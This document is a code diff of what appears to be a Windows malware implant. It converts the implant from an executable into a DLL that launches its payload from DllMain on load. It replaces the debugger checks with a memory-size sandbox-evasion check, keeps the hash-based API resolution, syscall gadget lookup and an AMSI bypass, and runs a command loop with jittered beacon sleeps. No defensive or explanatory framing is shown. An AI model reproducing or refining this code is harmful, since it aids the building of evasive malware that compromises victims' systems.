@@ -77,35 +77,37 @@ static void InitializeApiTable() {
     g_ApiTable.GetModuleFileNameW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetModuleFileNameW);
 }
 
-static BOOL IsEnvironmentSafe() {
-    PPEB peb = (PPEB)__readgsqword(0x60);
-    if (peb->BeingDebugged) return FALSE;
-    if (peb->NtGlobalFlag & 0x70) return FALSE;
+static void StealthSleep(DWORD dwBaseMS) {
+    srand((unsigned int)time(NULL));
+    float jitter = (float)(rand() % (C2_JITTER * 2) - C2_JITTER) / 100.0f;
+    DWORD dwSleepTime = dwBaseMS + (DWORD)(dwBaseMS * jitter);
 
-    PVOID pHeap = (PVOID)*(PULONG_PTR)((PBYTE)peb + (sizeof(PVOID) * 2));
-    DWORD heapFlags = *(PDWORD)((PBYTE)pHeap + (sizeof(PVOID) * 3));
-    if (heapFlags & ~HEAP_GROWABLE) return FALSE;
+    HANDLE hTimer = ((HANDLE(WINAPI *)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR))g_ApiTable.CreateWaitableTimerW)(NULL, FALSE, NULL);
+    if (!hTimer) return;
 
-    CONTEXT ctx = {0};
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-    if (GetThreadContext(GetCurrentThread(), &ctx)) {
-        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return TRUE;
-    }
+    LARGE_INTEGER liDueTime;
+    liDueTime.QuadPart = -(LONGLONG)dwSleepTime * 10000LL;
+    ((BOOL(WINAPI *)(HANDLE, const LARGE_INTEGER*, LONG, PTIMERAPCROUTINE, LPVOID, BOOL))g_ApiTable.SetWaitableTimer)(hTimer, &liDueTime, 0, NULL, NULL, FALSE);
+    
+    WaitForSingleObject(hTimer, INFINITE);
+    CloseHandle(hTimer);
+}
 
+static BOOL IsTargetEnvironment() {
+    MEMORYSTATUSEX statex;
+    statex.dwLength = sizeof(statex);
+    GlobalMemoryStatusEx(&statex);
+    if (statex.ullTotalPhys < (8ULL * 1024 * 1024 * 1024)) return FALSE;
     return TRUE;
 }
 
-int main() {
-    if (!IsEnvironmentSafe()) return 0;
-    
+extern "C" __declspec(dllexport) void StartPlugin() {
     g_SyscallGadget = FindSyscallGadget();
     InitializeApiTable();
 
     BypassAMSI_DataOnly();
 
-    wchar_t selfPath[MAX_PATH];
-    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
-    BypassUAC_SilentCleanupHardened(selfPath);
+    if (!IsTargetEnvironment()) return;
 
     char cmdBuffer[1024];
     while (TRUE) {
@@ -113,6 +115,13 @@ int main() {
         }
         StealthSleep(60000); 
     }
+}
 
-    return 0;
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    switch (fdwReason) {
+        case DLL_PROCESS_ATTACH:
+            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartPlugin, NULL, 0, NULL);
+            break;
+    }
+    return TRUE;
 }
